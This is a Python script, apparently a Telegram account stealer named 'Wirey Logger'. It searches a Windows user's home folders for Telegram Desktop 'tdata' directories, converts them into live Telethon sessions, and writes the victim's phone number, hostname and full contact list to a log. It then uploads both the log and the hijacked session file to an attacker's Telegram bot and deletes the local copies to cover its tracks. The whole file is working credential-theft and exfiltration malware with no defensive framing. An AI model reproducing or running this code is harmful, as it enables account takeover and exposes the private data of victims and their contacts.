import os
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from opentele.td import TDesktop
from opentele.tl import TelegramClient
from opentele.api import API, UseCurrentSession
import opentele
import asyncio
import string,random
import telethon
from telethon.tl import functions, types
import socket,requests
import time

def rm(file, retries=5):
    for _ in range(retries):
        try:
            os.remove(file)
            break
        except PermissionError:
            time.sleep(0.5)


dir = [Path.home() / "Downloads",Path.home() / "Documents",Path.home() / "Desktop",Path.home() / "Pictures",Path.home() / "Videos",Path.home() / "Music",Path.home() / "AppData" / "Roaming",Path.home() / "AppData" / "Local"]
def chl(path) -> bool:
    path = Path(path)
    if not path.is_dir():
        return False
    for item in path.iterdir():
        if item.name.lower() in ["key_data", "key_datas"]:
            return True
    return False
def SCAN(dirdir):
    matches = []
    for root, dirs, files in os.walk(dirdir, topdown=True):
        root_path = Path(root)
        if any(f.lower() == "telegram.exe" for f in files):
            for dn in dirs:
                if dn.lower() == "tdata":
                    matches.append(str(root_path / dn))

        for dn in dirs:
            if dn.lower() == "tdata":
                if "telegram" in root_path.name.lower():
                    matches.append(str(root_path / dn))

    return matches

async def main():
    results = []
    with ThreadPoolExecutor(max_workers=os.cpu_count() or 4) as executor:
        futures = [executor.submit(SCAN, d) for d in dir if d.exists()]
        for future in as_completed(futures):
            results.extend(future.result())
          ## faster search, dont remove this cuz its PAINFULLY slow

    results = list(set(results))
    for path in results:
        print(f"{path}")
        tdataFolder = path
        if not chl(path):
            print(f"[!] no key_data {path}")
            continue

        print(f"[+] {path}")
        try:
            tdesk = TDesktop(path)
        except opentele.exception.OpenTeleException as e:
            print(f"[!] ass {path} — opentele broken!: {e}")
            continue
        except Exception as e:
            print(f"[!] idk something in {path}: {e}")
            continue

        api = API.TelegramMacOS.Generate()
        nn = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5)) + ".session"
        try:
            client = await tdesk.ToTelethon(nn, UseCurrentSession, api)
        except Exception as e:
            print(f"eblan {e}")
            continue
        await client.connect()

        if not await client.is_user_authorized():
            print(f"[!] AuthKeyUnregistered: {path}")
            await client.disconnect()
            continue

        me = await client.get_me()
        result = await client(functions.contacts.GetContactsRequest(hash=0))
        name = "log" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(2)) + ".txt"
        f = open(name, "a", encoding="UTF-8")
        f.write(f"--- Wirey Logger --- PC: {socket.gethostname()} --- Number: {me.phone} ---\n")
        for u in result.users:
            user_id = u.id
            username = u.username or "@?"
            phone = u.phone or "?"
            first_name = u.first_name or ""
            last_name = u.last_name or ""
            full_name = f"{first_name} {last_name}".strip()
            f.write(f"{full_name} - - - userid {user_id} - - - username {username} - - - phone {phone}\n")
        
        f.close()

        url = f'https://api.telegram.org/bot[TOKEN]/sendDocument'

        with open(name, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': 'USERID', 'caption': f'✅ WL - user successfully logged! {me.phone}[{socket.gethostname()}]\n(if you see more from the same pc, it means they have multiple accs)'}
            response = requests.post(url, data=data, files=files)
        with open(nn, 'rb') as session_file:
            files = {'document': session_file}
            data = {
                'chat_id': 'USERID',
                'caption': f'📂✅ WL - session logged! : {nn}\{me.phone} ({socket.gethostname()})'
            }
            response = requests.post(url, data=data, files=files)
        await client.disconnect()
        await asyncio.sleep(0.5)
        rm(name)
        rm(nn)
        

if __name__ == "__main__":
    asyncio.run(main())
